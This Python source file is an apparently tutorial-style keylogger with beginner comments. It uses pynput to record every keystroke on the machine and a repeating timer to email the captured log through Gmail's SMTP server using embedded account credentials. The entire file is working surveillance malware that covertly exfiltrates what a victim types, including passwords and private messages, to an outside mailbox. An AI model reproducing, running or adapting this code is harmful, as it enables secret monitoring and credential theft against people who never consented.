#!/usr/bin/evn python
import pynput.keyboard #library that allow to monitor keyboard
import threading
import smtplib #library that allow to send emails from our code

#every method that defined inside the class has to write self befor the first arggument
class Keylogger:
    def __init__(self, time_interval, email, password): #constructor
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
    def append_to_log(self, string):
        self.log = self.log + string #to stor multiple key pressed

    def process_key_press(self, key): #key is the varable include the key that user has pressed
        try:    #to avoid error when a spical key pressed
            current_key = str(key.char)
        except AttributeError:
            if key == key.space: #to avoid show key.space as is
                current_key = " "
            else:
                current_key = " " + str(key) + " " #to make space between chararcters
        self.append_to_log(current_key)

    def report(self): #Threading to avoid infint loop, timer run simtanusolliy with keylogger
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = "" #reset the log to nothing
        timer = threading.Timer(self.interval, self.report)
        timer.start()     #Timer is a class and timer is a method in Timer class

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)  # create server instant, google becuse allow us to send emails , 587 port , we can use this to send the email
        server.starttls()  # tls connection using the server
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        kyeboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)  #Listener is an instant object that we take from pynput.keyboard, that listen to the entered keys
                                                                   #process_key_press is call back function executed evert key strike is entered
                                                    #on_press is executing the call back function when the key pressed
        with kyeboard_listener:#with keyboard to enteract with keyboard listener unmanaged stream of data
            self.report()
            kyeboard_listener.join()#join method used to start the listener
